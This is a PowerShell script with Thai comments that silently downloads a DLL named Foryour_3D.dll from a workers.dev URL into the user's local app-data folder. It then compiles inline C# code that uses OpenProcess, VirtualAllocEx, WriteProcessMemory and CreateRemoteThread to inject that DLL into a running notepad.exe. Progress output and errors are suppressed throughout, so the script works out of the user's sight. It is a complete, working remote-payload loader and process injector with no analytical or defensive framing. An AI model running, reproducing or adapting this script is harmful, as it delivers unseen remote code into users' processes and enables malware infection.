# ปิดการแสดงแถบดาวน์โหลดและข้อความทั้งหมด
$ProgressPreference = 'SilentlyContinue'

$dllUrl = "https://zenx-installer.0xforyourstore.workers.dev/app"
$installDir = "$env:LOCALAPPDATA\Foryour3D"
$dllPath = "$installDir\Foryour_3D.dll"

# ============================================================
# โค้ด C# สำหรับ DLL Injection ผ่าน Windows API
# ============================================================
$injectorCode = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

public class DllInjector {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr, uint size, uint allocType, uint protect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr baseAddr, byte[] buffer, uint size, out int written);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string modName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProc, IntPtr attr, uint stackSize, IntPtr startAddr, IntPtr param, uint flags, out uint threadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr handle);

    public static bool Inject(int pid, string dllPath) {
        // เปิด Process ด้วยสิทธิ์ Full Access
        IntPtr hProc = OpenProcess(0x1F0FFF, false, pid);
        if (hProc == IntPtr.Zero) return false;

        // จองพื้นที่ใน Memory ของ Process ปลายทาง
        byte[] pathBytes = Encoding.Unicode.GetBytes(dllPath + "\0");
        IntPtr allocMem = VirtualAllocEx(hProc, IntPtr.Zero, (uint)pathBytes.Length, 0x3000, 0x40);
        if (allocMem == IntPtr.Zero) { CloseHandle(hProc); return false; }

        // เขียน Path ของ DLL เข้าไปใน Memory ของ Process ปลายทาง
        int written = 0;
        if (!WriteProcessMemory(hProc, allocMem, pathBytes, (uint)pathBytes.Length, out written)) {
            CloseHandle(hProc); return false;
        }

        // หาที่อยู่ของฟังก์ชัน LoadLibraryW ใน kernel32.dll
        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryW");
        if (loadLib == IntPtr.Zero) { CloseHandle(hProc); return false; }

        // สร้าง Thread ใหม่ใน Process ปลายทาง เพื่อโหลด DLL เข้าไป
        uint threadId = 0;
        IntPtr hThread = CreateRemoteThread(hProc, IntPtr.Zero, 0, loadLib, allocMem, 0, out threadId);
        if (hThread == IntPtr.Zero) { CloseHandle(hProc); return false; }

        CloseHandle(hThread);
        CloseHandle(hProc);
        return true;
    }
}
"@

try {
    # สร้างโฟลเดอร์สำหรับเก็บ DLL
    if (!(Test-Path $installDir)) {
        New-Item -ItemType Directory -Path $installDir -Force | Out-Null
    }

    # ดาวน์โหลดไฟล์ Foryour_3D.dll แบบเงียบๆ
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing

    # โหลด C# Injector เข้า PowerShell
    Add-Type -TypeDefinition $injectorCode -Language CSharp

    # Inject DLL เข้าไปใน notepad.exe ที่เปิดอยู่แล้วเท่านั้น
    $notepad = Get-Process -Name "notepad" -ErrorAction SilentlyContinue
    if ($notepad) {
        [DllInjector]::Inject($notepad.Id, $dllPath) | Out-Null
    }

} catch {
    # ทำงานเงียบ
}
